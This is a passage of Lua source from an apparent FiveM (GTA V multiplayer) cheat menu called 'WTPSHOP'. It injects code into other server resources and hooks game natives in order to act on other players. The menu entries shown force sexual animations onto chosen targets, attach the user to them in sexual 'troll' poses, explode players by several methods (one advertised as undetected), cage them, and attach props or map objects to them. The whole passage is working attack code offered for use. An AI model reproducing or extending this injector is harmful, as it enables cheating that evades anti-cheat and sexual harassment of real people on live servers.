                                    self:Notify("success", "WTPSHOP", "Target Hijacked!", 3000)
                                else
                                    ApiRasclat.SafeRes([[
                                        _G.FlyVehicle = false
                                        local player = PlayerPedId()

                                        if _G.OriginalCoords then
                                            SetEntityCoords(player, _G.OriginalCoords.x, _G.OriginalCoords.y, _G.OriginalCoords.z, false, false, false, false)
                                            _G.OriginalCoords = nil -- Reset for next time
                                        end

                                        SetEntityVisible(player, true, false)
                                        ResetEntityAlpha(player)
                                        SetEntityCollision(player, true, true)
                                    ]])
                                    self:Notify("info", "WTPSHOP", "Returned to Last Position", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Emotes" },
                        {
                            type = "scrollable", 
                            label = "Force", 
                            desc = "This force an emote to the target player.", 
                            scrollType = "onEnter", 
                            value = 1,
                            values = { "Spooning", "Receive Blowjob", "Cowgirl", "Doggystyle Male 2", "Missionary" },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local EmoteList = {
                                    ["Spooning"] = {
                                        Label      = "Spooning",
                                        Command    = "sex11",
                                        Dictionary = "zmdev@erotica_spooningm",
                                        Animation  = "spooningm",
                                        OtherEmote = "sex12"
                                    },
                                    ["Receive Blowjob"] = {
                                        Label      = "Receive Blowjob",
                                        Command    = "sreceiveblowjob",
                                        Dictionary = "misscarsteal2pimpsex",
                                        Animation  = "pimpsex_punter",
                                        OtherEmote = "sgiveblowjob"
                                    },
                                    ["Cowgirl"] = {
                                        Label      = "Cowgirl",
                                        Command    = "sex13",
                                        Dictionary = "zmdev@erotica_standingcowgirlm",
                                        Animation  = "standingcowgirlm",
                                        OtherEmote = "sex14"
                                    },
                                    ["Doggystyle Male 2"] = {
                                        Label      = "Doggystyle Male 2",
                                        Command    = "sex7",
                                        Dictionary = "zmdev@erotica_doggystyle2m",
                                        Animation  = "doggystyle2m",
                                        OtherEmote = "sex8"
                                    },
                                    ["Missionary"] = {
                                        Label      = "Doggystyle Male 2",
                                        Command    = "sex3",
                                        Dictionary = "zmdev@erotica_missionary2m",
                                        Animation  = "missionary2m",
                                        OtherEmote = "sex4"
                                    }
                                }

                                local targetId = targetPlayers[1]
                                local d = EmoteList[value]
                                if not d then return end

                                ApiRasclat.SafeRes(buildScullySyncTargetInject(targetId, d))
                            end
                        },
                        {
                            type = "scrollable-checkbox",
                            label = "Emote Troll",
                            checked = false,
                            value = 1,
                            values = {"Twerk On Them", "Give Them Backshots", "Blame Arrest", "Blame Carry", "Piggy Back", "Pasan", "Blow Driver"},
                            onSelect = function(selectedValue, checked)
                                if checked then
                                    local targets = {}
                                    for serverId, isSelected in pairs(CPlayers) do
                                        if isSelected then
                                            table.insert(targets, serverId)
                                        end
                                    end

                                    if #targets == 0 then
                                        self:Notify("error", "WTPSHOP", "Select a player first!", 3000)
                                        return
                                    end

                                    local actionName = type(selectedValue) == "string" and selectedValue or "Unknown"

                                    for _, targetId in ipairs(targets) do
                                        if actionName == "Twerk On Them" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "switch@trevor@mocks_lapdance"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                    WTPSHOP.Native(TaskPlayAnim, playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Give Them Backshots" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "rcmpaparazzo_2"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, playerPed, targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                    WTPSHOP.Native(TaskPlayAnim, playerPed, dict, "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                                    WTPSHOP.Native(TaskPlayAnim, targetPed, dict, "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Blame Arrest" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "mp_arresting"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                    WTPSHOP.Native(TaskPlayAnim, PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Blame Carry" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "nm"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                                    WTPSHOP.Native(TaskPlayAnim, PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Piggy Back" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "anim@arena@celeb@flat@paired@no_props@"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                                    WTPSHOP.Native(TaskPlayAnim, PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)

                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Pasan" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "anim@heists@fleeca_bank@hostages@intro"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                                    WTPSHOP.Native(TaskPlayAnim, PlayerPedId(), "anim@heists@fleeca_bank@hostages@intro", "intro_loop_ped_a", 8.0, -8.0, 1000000, 33, 0, false, false, false)

                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        elseif actionName == "Blow Driver" then
                                            ApiRasclat.SafeRes(string.format([[
                                                WTPSHOP.Native(CreateThread, function()
                                                    local targetId = %d
                                                    local playerPed = PlayerPedId()
                                                    local pIndex = GetPlayerFromServerId(targetId)
                                                    if pIndex == -1 then return end
                                                    local targetPed = GetPlayerPed(pIndex)
                                                    
                                                    if not DoesEntityExist(targetPed) or targetPed == playerPed then return end

                                                    local dict = "mini@prostitutes@sexnorm_veh"
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do WTPSHOP.Native(Wait, 0) end

                                                    WTPSHOP.Native(AttachEntityToEntity, playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                                    WTPSHOP.Native(TaskPlayAnim, playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                                    
                                                    TrollingActive = true
                                                    while TrollingActive do
                                                        WTPSHOP.Native(Wait, 1000)
                                                        if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                            TrollingActive = false
                                                            break
                                                        end
                                                    end
                                                    WTPSHOP.Native(DetachEntity, playerPed, true, false)
                                                    WTPSHOP.Native(ClearPedTasks, playerPed)
                                                end)
                                            ]], tonumber(targetId)))
                                        end
                                    end

                                    self:Notify("success", "WTPSHOP", "Action: " .. tostring(actionName) .. " started!", 3000)
                                else
                                    executeCode("any", [[
                                        TrollingActive = false
                                        WTPSHOP.Native(DetachEntity, PlayerPedId(), true, false)
                                        WTPSHOP.Native(ClearPedTasks, PlayerPedId())
                                    ]])
                                end
                            end
                        },
                    }
                },
                {
                    label = "Risky",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Method 1", "Method 2", "Method 3"}, label = "Explode Player",
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Method 1" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        MachoHookNative(0x6ADAABD3068C5235, function(ped)
                                            return false, true
                                        end)
                                        executeCode(targetRes, [[
                                            WTPSHOP.Native(CreateThread, function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = WTPSHOP.Native(GetPlayerFromServerId, targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = WTPSHOP.Native(GetPlayerPed, targetPlayer)
                                                if not WTPSHOP.Native(DoesEntityExist, ped) then return end
                                                local coords = WTPSHOP.Native(GetEntityCoords, ped)
                                                local model = WTPSHOP.Native(GetHashKey, "sultan")
                                                WTPSHOP.Native(RequestModel, model)
                                                while not WTPSHOP.Native(HasModelLoaded, model) do
                                                    WTPSHOP.Native(Wait, 0)
                                                end
                                                local veh = WTPSHOP.Native(CreateVehicle, model, coords.x, coords.y + 10, coords.z, 0.0, true, false)
                                                WTPSHOP.Native(SetEntityVisible, veh, false, false)
                                                WTPSHOP.Native(AddVehiclePhoneExplosiveDevice, veh)
                                                WTPSHOP.Native(Wait, 1000)
                                                WTPSHOP.Native(SetEntityCoords, veh, WTPSHOP.Native(GetEntityCoords, ped), true, true, true)
                                                WTPSHOP.Native(Wait, 100)
                                                WTPSHOP.Native(DetonateVehiclePhoneExplosiveDevice, veh)
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, veh)
                                                WTPSHOP.Native(Wait, 400)
                                                WTPSHOP.Native(DeleteEntity, veh)
                                            end)
                                        ]])
                                    end
                                elseif value == "Method 2" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetRes, [[
                                            WTPSHOP.Thread(function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = WTPSHOP.Native(GetPlayerFromServerId, targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = WTPSHOP.Native(GetPlayerPed, targetPlayer)
                                                if not WTPSHOP.Native(DoesEntityExist, ped) then return end

                                                local veh = WTPSHOP.Native(GetHashKey, "volatus")
                                                WTPSHOP.Native(RequestModel, veh)
                                                while not WTPSHOP.Native(HasModelLoaded, veh) do
                                                    WTPSHOP.Wait(0)
                                                end

                                                local coords = WTPSHOP.Native(GetEntityCoords, ped)
                                                local vehh = WTPSHOP.Native(CreateVehicle, veh, coords.x, coords.y, coords.z + 30 , 0.0, true, true)
                                                WTPSHOP.Wait(1000)
                                                WTPSHOP.Native(SetEntityVisible, vehh, false, false)
                                                WTPSHOP.Native(SetVehicleEngineHealth, vehh, -4000.0)
                                                WTPSHOP.Native(SetVehicleBodyHealth, vehh, 0.0)
                                                WTPSHOP.Native(SetVehicleFuelLevel, vehh, 1000.0)
                                                WTPSHOP.Native(SetEntityVelocity, vehh, 0.0, 0.0, -80.0)
                                                WTPSHOP.Wait(400)
                                                WTPSHOP.Native(DeleteEntity, vehh)
                                            end)
                                        ]])
                                    end
                                elseif value == "Method 3" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetRes, [[
                                            WTPSHOP.Thread(function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = WTPSHOP.Native(GetPlayerFromServerId, targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = WTPSHOP.Native(GetPlayerPed, targetPlayer)
                                                if not WTPSHOP.Native(DoesEntityExist, ped) then return end
                                                local coords = WTPSHOP.Native(GetEntityCoords, ped)
                                                local model = "prop_aircon_m_04"
                                                WTPSHOP.Native(RequestModel, model)
                                                while not WTPSHOP.Native(HasModelLoaded, model) do WTPSHOP.Wait(0) end

                                                local obj = WTPSHOP.Native(CreateObjectNoOffset, model, coords.x, coords.y, coords.z - 1.0, true, true, false)
                                                if not WTPSHOP.Native(DoesEntityExist, obj) then return end
                                                
                                                WTPSHOP.Native(NetworkRegisterEntityAsNetworked, obj)
                                                local netId = WTPSHOP.Native(ObjToNet, obj)
                                                WTPSHOP.Native(SetNetworkIdExistsOnAllMachines, netId, true)
                                                WTPSHOP.Native(SetNetworkIdCanMigrate, netId, true)
                                                
                                                WTPSHOP.Native(PlaceObjectOnGroundProperly, obj)
                                                WTPSHOP.Native(SetEntityVisible, obj, false, false)
                                                WTPSHOP.Native(SetEntityCollision, obj, false, false)
                                                WTPSHOP.Native(FreezeEntityPosition, obj, true)
                                                
                                                local pos = WTPSHOP.Native(GetEntityCoords, obj)
                                                local fireIds = {}
                                                local offsets = {
                                                    {0.0, 0.0, 0.0},
                                                    {0.35, 0.0, 0.0},
                                                    {-0.35, 0.0, 0.0},
                                                    {0.0, 0.35, 0.0},
                                                    {0.0, -0.35, 0.0},
                                                }
                                                
                                                for i=1, #offsets do
                                                    local off = offsets[i]
                                                    local id = WTPSHOP.Native(StartScriptFire, pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
                                                    if id and id ~= -1 then
                                                        fireIds[#fireIds+1] = id
                                                    end
                                                end
                                                
                                                local entFire = WTPSHOP.Native(StartEntityFire, obj)
                                                
                                                local timeout = WTPSHOP.Native(GetGameTimer) + 10000
                                                while WTPSHOP.Native(GetGameTimer) < timeout and WTPSHOP.Native(DoesEntityExist, obj) do
                                                    WTPSHOP.Wait(200)
                                                end
                                                
                                                for i=1, #fireIds do
                                                    WTPSHOP.Native(RemoveScriptFire, fireIds[i])
                                                end
                                                
                                                if entFire and entFire ~= -1 then
                                                    WTPSHOP.Native(RemoveScriptFire, entFire)
                                                end
                                                WTPSHOP.Native(StopEntityFire, obj)
                                                
                                                if WTPSHOP.Native(DoesEntityExist, obj) then
                                                    WTPSHOP.Native(DeleteObject, obj)
                                                end
                                                
                                                WTPSHOP.Native(SetModelAsNoLongerNeeded, model)
                                            end)
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "button", label = "Silent Explosion", desc = 'Explode player completely UD.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                ApiRasclat.SafeRes(string.format([[
                                    local ped = GetPlayerPed(GetPlayerFromServerId(%d))
                                    local coords = GetEntityCoords(ped)
                                    local model = GetHashKey("sultan")
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do
                                        Wait(0)
                                    end
                                    local veh = CreateVehicle(model, coords.x, coords.y + 10, coords.z, 0.0, false, false)
                                    SetEntityVisible(veh,false,false)
                                    SetEntityAsNoLongerNeeded(veh)
                                    SetEntityVisible(veh,false,false)
                                    SetVehicleAsNoLongerNeeded(veh)
                                    SetEntityVisible(veh,false,false)
                                    Wait(1000)
                                    SetEntityCoords(veh, GetEntityCoords(ped) ,true, true, true)
                                    Wait(100)
                                    NetworkExplodeVehicle(veh, true, true, true)
                                    Wait(200)
                                    NetworkRequestControlOfEntity(veh)
                                    DeleteEntity(veh)
                                ]], targetID))
                            end
                        },
                        { type = "button", label = "Cage Player", desc = 'This will cage the target.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                ApiRasclat.SafeRes(string.format([[
                                    WTPSHOP.Thread(function()
                                        local awidaowdhoa = {
                                            ["GetHashKey"] = function(...) return WTPSHOP.Native(GetHashKey, ...) end,
                                            ["RequestModel"] = function(...) return WTPSHOP.Native(RequestModel, ...) end,
                                            ["GetGameTimer"] = function(...) return WTPSHOP.Native(GetGameTimer, ...) end,
                                            ["HasModelLoaded"] = function(...) return WTPSHOP.Native(HasModelLoaded, ...) end,
                                            ["Wait"] = function(...) return WTPSHOP.Wait(...) end,
                                            ["GetActivePlayers"] = function(...) return WTPSHOP.Native(GetActivePlayers, ...) end,
                                            ["GetPlayerServerId"] = function(...) return WTPSHOP.Native(GetPlayerServerId, ...) end,
                                            ["GetPlayerPed"] = function(...) return WTPSHOP.Native(GetPlayerPed, ...) end,
                                            ["DoesEntityExist"] = function(...) return WTPSHOP.Native(DoesEntityExist, ...) end,
                                            ["GetEntityCoords"] = function(...) return WTPSHOP.Native(GetEntityCoords, ...) end,
                                            ["CreateObject"] = function(...) return WTPSHOP.Native(CreateObject, ...) end,
                                            ["SetEntityAsMissionEntity"] = function(...) return WTPSHOP.Native(SetEntityAsMissionEntity, ...) end,
                                            ["FreezeEntityPosition"] = function(...) return WTPSHOP.Native(FreezeEntityPosition, ...) end,
                                            ["AttachEntityToEntity"] = function(...) return WTPSHOP.Native(AttachEntityToEntity, ...) end,
                                            ["SetModelAsNoLongerNeeded"] = function(...) return WTPSHOP.Native(SetModelAsNoLongerNeeded, ...) end
                                        }

                                        local sid = %d
                                        local modelName = "prop_container_ld_pu"
                                        local model = awidaowdhoa["GetHashKey"](modelName)

                                        awidaowdhoa["RequestModel"](model)
                                        local timeout = awidaowdhoa["GetGameTimer"]() + 5000
                                        while not awidaowdhoa["HasModelLoaded"](model) and awidaowdhoa["GetGameTimer"]() < timeout do
                                            awidaowdhoa["Wait"](10)
                                        end
                                        
                                        if not awidaowdhoa["HasModelLoaded"](model) then return end

                                        local function getPedBySid(s)
                                            for _, pid in ipairs(awidaowdhoa["GetActivePlayers"]()) do
                                                if awidaowdhoa["GetPlayerServerId"](pid) == s then 
                                                    return awidaowdhoa["GetPlayerPed"](pid) 
                                                end
                                            end
                                            return 0
                                        end

                                        local targetPed = getPedBySid(sid)
                                        if targetPed ~= 0 and awidaowdhoa["DoesEntityExist"](targetPed) then
                                            local coords = awidaowdhoa["GetEntityCoords"](targetPed)
                                            local obj = awidaowdhoa["CreateObject"](model, coords.x, coords.y, coords.z - 1.0, true, true, false)
                                            
                                            if obj ~= 0 and awidaowdhoa["DoesEntityExist"](obj) then
                                                awidaowdhoa["SetEntityAsMissionEntity"](obj, true, true)
                                                awidaowdhoa["FreezeEntityPosition"](obj, true)
                                            end
                                        end
                                        awidaowdhoa["SetModelAsNoLongerNeeded"](model)
                                    end)
                                ]], targetID))
                                self:Notify("success", "WTPSHOP", "Attempting to cage Player", 5000)
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        { type = "button", label = "Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleClonePlayer(targetPlayers)
                                self:Notify("success", "WTPSHOP", "Cloned Player", 5000)
                            end
                        },
                        { type = "button", label = "Attack Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleAttackClonePlayer(targetPlayers)
                                self:Notify("success", "WTPSHOP", "Cloned Player", 5000)
                            end
                        },
                        { type = "divider", label = "Object Options" },
                        {
                            type = "scrollable",
                            label = "Attach Prop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_barrel_02a", "prop_cone_float_1", "prop_chair_01a", "prop_boombox_01",
                                "prop_tool_broom", "prop_golf_ball", "prop_laptop_01a", "prop_trafficcone_01a",
                                "prop_pizza_box_01", "prop_mb_cargo_01a", "prop_ld_crate_01a", "prop_ld_fueldoor",
                                "prop_ld_greenscreen_01", "prop_ld_shovel", "prop_snow_bottle", "prop_snow_locker_01",
                                "prop_dummy_01", "prop_dummy_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTPSHOP:GetSelectedObjectModel()
                                    return value
                                end

                                WTPSHOP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTPSHOP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Furniture",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_table_01", "prop_table_02", "prop_table_03", "prop_chair_02",
                                "prop_chair_03", "prop_chair_04a", "prop_sofa_01", "prop_sofa_02",
                                "prop_sofa_03", "prop_bed_01", "prop_bed_02", "prop_lamp_01",
                                "prop_lamp_02", "prop_lamp_03", "prop_couch_01", "prop_couch_02",
                                "prop_tv_01", "prop_tv_02", "prop_tv_03", "prop_computer_01",
                                "prop_computer_02", "prop_monitor_01", "prop_monitor_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTPSHOP:GetSelectedObjectModel()
                                    return value
                                end

                                WTPSHOP:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Misc",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_beer_bottle", "prop_soda_cup", "prop_papercup_01", "prop_cup_coffee_01",
                                "prop_champ_flute", "prop_cs_burger_01", "prop_cs_burger_02", "prop_cs_hotdog_01",
                                "prop_cs_pizza_01", "prop_cs_sandwich_01", "prop_cs_juice_01"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTPSHOP:GetSelectedObjectModel()
                                    return value
                                end

                                WTPSHOP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTPSHOP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Object",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "p_ferris_wheel_amo_l", "p_ferris_wheel_amo_l2", "p_ferris_wheel_amo_p", "prop_gas_tank_02a"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTPSHOP:GetSelectedObjectModel()
                                    return value
                                end

                                WTPSHOP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTPSHOP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Location",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"City", "Docks", "Playa Vista", "Mountain", "Pink Cage", "Vespucci", "Mega Mall"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end
                                local mapValues = {
                                    ["City"] = "dt1_lod_slod3",
                                    ["Docks"] = "id2_lod_slod4",
                                    ["Playa Vista"] = "kt1_lod_slod4",
                                    ["Mountain"] = "ch2_lod_slod3",
                                    ["Pink Cage"] = "hw1_lod_slod4",
                                    ["Vespucci"] = "kt1_lod_slod4",
                                    ["Mega Mall"] = "sc1_lod_slod4"
                                }
                                local mapHash = mapValues[value]
                                function WTPSHOP:GetSelectedObjectModel()
                                    return mapHash
                                end

                                WTPSHOP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTPSHOP", "Attach Location for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Object",
                            scrollType = "onEnter",
                            value = 1,
